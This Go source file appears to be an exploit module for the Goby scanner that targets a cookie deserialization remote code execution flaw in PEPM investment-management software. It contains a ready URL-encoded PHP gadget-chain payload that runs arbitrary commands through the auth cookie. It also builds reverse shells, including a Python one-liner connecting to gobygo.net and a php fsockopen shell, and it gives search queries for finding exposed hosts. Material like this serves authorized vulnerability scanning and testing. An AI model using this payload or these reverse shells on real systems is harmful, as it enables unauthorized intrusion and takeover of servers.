package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "PEPM Cookie Code Execution Vulnerability",
    "Description": "<p>PEPM is a leading equity investment management software in China developed by Suzhou Zichuan Information Technology Co., Ltd. PEPM is committed to combining mature Internet technology with enterprise business applications to provide users with professional, easy-to-use and low-cost software services. PEPM covers all aspects of fund operation and performance management, such as fundraising, investment, management, and withdrawal, and meets the management needs of investment institutions in the whole process from project screening, due diligence, investment decision-making, post-investment management to exit and liquidation. </p><p>There is a remote code execution vulnerability in the PEPM system, and there is a deserialization vulnerability in the auth field of cookies, which allows an attacker to construct a deserialization chain to generate malicious data and execute arbitrary PHP code.</p>",
    "Product": "PEPM",
    "Homepage": "https://www.pepm.com.cn/",
    "DisclosureDate": "2024-08-06",
    "PostTime": "2024-08-06",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "header=\"pepm\" && (body=\"pepm\" || body=\"/usr/login/\" || header=\"Apache\")",
    "GobyQuery": "header=\"pepm\" && (body=\"pepm\" || body=\"/usr/login/\" || header=\"Apache\")",
    "Level": "3",
    "Impact": "<p>There is a remote code execution vulnerability in the PEPM system, and there is a deserialization vulnerability in the auth field of cookies, which allows an attacker to construct a deserialization chain to generate malicious data and execute arbitrary PHP code.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "BySh",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2024",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "PEPM Cookie 代码执行漏洞",
            "Product": "PEPM",
            "Description": "<p>PEPM是由苏州梓川信息科技有限公司开发的中国领先股权投资管理软件。PEPM致力于将成熟互联网技术与企业业务应用结合，为用户提供专业、易用且低成本的软件服务。PEPM覆盖了募、投、管、退等基金运营和业绩管理的各个环节，满足投资机构从项目筛选、尽职调查、投资决策、投后管理到退出清算的全流程管理需求。</p><p>PEPM系统存在远程代码执行漏洞，Cookie的auth字段存在反序列化漏洞，攻击者可构造反序列化链生成恶意数据，执行任意PHP代码。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>PEPM系统存在远程代码执行漏洞，Cookie的auth字段存在反序列化漏洞，攻击者可构造反序列化链生成恶意数据，执行任意PHP代码。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "HW-2024",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "PEPM Cookie Code Execution Vulnerability",
            "Product": "PEPM",
            "Description": "<p>PEPM is a leading equity investment management software in China developed by Suzhou Zichuan Information Technology Co., Ltd. PEPM is committed to combining mature Internet technology with enterprise business applications to provide users with professional, easy-to-use and low-cost software services. PEPM covers all aspects of fund operation and performance management, such as fundraising, investment, management, and withdrawal, and meets the management needs of investment institutions in the whole process from project screening, due diligence, investment decision-making, post-investment management to exit and liquidation.&nbsp;</p><p>There is a remote code execution vulnerability in the PEPM system, and there is a deserialization vulnerability in the auth field of cookies, which allows an attacker to construct a deserialization chain to generate malicious data and execute arbitrary PHP code.</p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is a remote code execution vulnerability in the PEPM system, and there is a deserialization vulnerability in the auth field of cookies, which allows an attacker to construct a deserialization chain to generate malicious data and execute arbitrary PHP code.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "HW-2024",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9919"
}`
	setPayloadRequestHashcanscj823jnf7yacijfenf724uhf72bfy := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		vulURL := "/"
		makeRequest := httpclient.NewGetRequestConfig(vulURL)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		//对command字符串进行base64编码
		command = base64.StdEncoding.EncodeToString([]byte(command))
		//将command的长度加上54之后的数字转化为字符串strLength
		strLength := fmt.Sprintf("%d", len(command)+54)
		payload := "%61%3a%31%3a%7b%69%3a%30%3b%4f%3a%31%38%3a%22%70%68%70%73%65%63%6c%69%62%5c%4e%65%74%5c%53%53%48%31%22%3a%32%3a%7b%73%3a%36%3a%22%62%69%74%6d%61%70%22%3b%69%3a%31%3b%73%3a%36%3a%22%63%72%79%70%74%6f%22%3b%4f%3a%31%39%3a%22%70%68%70%73%65%63%6c%69%62%5c%43%72%79%70%74%5c%41%45%53%22%3a%38%3a%7b%73%3a%36%3a%22%62%69%74%6d%61%70%22%3b%69%3a%31%3b%73%3a%36%3a%22%63%72%79%70%74%6f%22%3b%69%3a%31%3b%73%3a%31%30%3a%22%62%6c%6f%63%6b%5f%73%69%7a%65%22%3b%4e%3b%73%3a%31%32%3a%22%69%6e%6c%69%6e%65%5f%63%72%79%70%74%22%3b%61%3a%32%3a%7b%69%3a%30%3b%4f%3a%32%35%3a%22%70%68%70%73%65%63%6c%69%62%5c%43%72%79%70%74%5c%54%72%69%70%6c%65%44%45%53%22%3a%36%3a%7b%73%3a%31%30%3a%22%62%6c%6f%63%6b%5f%73%69%7a%65%22%3b%73%3a" + strLength + "%3a%22%31%29%7b%7d%7d%7d%3b%20%6f%62%5f%63%6c%65%61%6e%28%29%3b%73%79%73%74%65%6d%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%27" + command + "%27%29%29%3b%64%69%65%28%29%3b%20%3f%3e%22%3b%73%3a%31%32%3a%22%69%6e%6c%69%6e%65%5f%63%72%79%70%74%22%3b%4e%3b%73%3a%31%36%3a%22%75%73%65%5f%69%6e%6c%69%6e%65%5f%63%72%79%70%74%22%3b%69%3a%31%3b%73%3a%37%3a%22%63%68%61%6e%67%65%64%22%3b%69%3a%30%3b%73%3a%36%3a%22%65%6e%67%69%6e%65%22%3b%69%3a%31%3b%73%3a%34%3a%22%6d%6f%64%65%22%3b%69%3a%31%3b%7d%69%3a%31%3b%73%3a%32%36%3a%22%5f%63%72%65%61%74%65%49%6e%6c%69%6e%65%43%72%79%70%74%46%75%6e%63%74%69%6f%6e%22%3b%7d%73%3a%31%36%3a%22%75%73%65%5f%69%6e%6c%69%6e%65%5f%63%72%79%70%74%22%3b%69%3a%31%3b%73%3a%37%3a%22%63%68%61%6e%67%65%64%22%3b%69%3a%30%3b%73%3a%36%3a%22%65%6e%67%69%6e%65%22%3b%69%3a%31%3b%73%3a%34%3a%22%6d%6f%64%65%22%3b%69%3a%31%3b%7d%7d%7d"
		makeRequest.Header.Store("Cookie", "auth="+payload)
		resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to execute command")
			return "", vulURL, err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.RawBody

		return commandResult, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashcanscj823jnf7yacijfenf724uhf72bfy

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashcanscj823jnf7yacijfenf724uhf72bfy

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "BySh" {
							reRequest := regexp.MustCompile("/dev/tcp/((.|\n)*?)/([0-9]+)")
							getserver := reRequest.FindStringSubmatch(command)
							command = `php -r '$sock=fsockopen("` + getserver[1] + `",` + getserver[3] + `);system("sh <&3 >&3 2>&3");'`
						}

						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output += "Command Result: \n" + Result
					return expResult
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
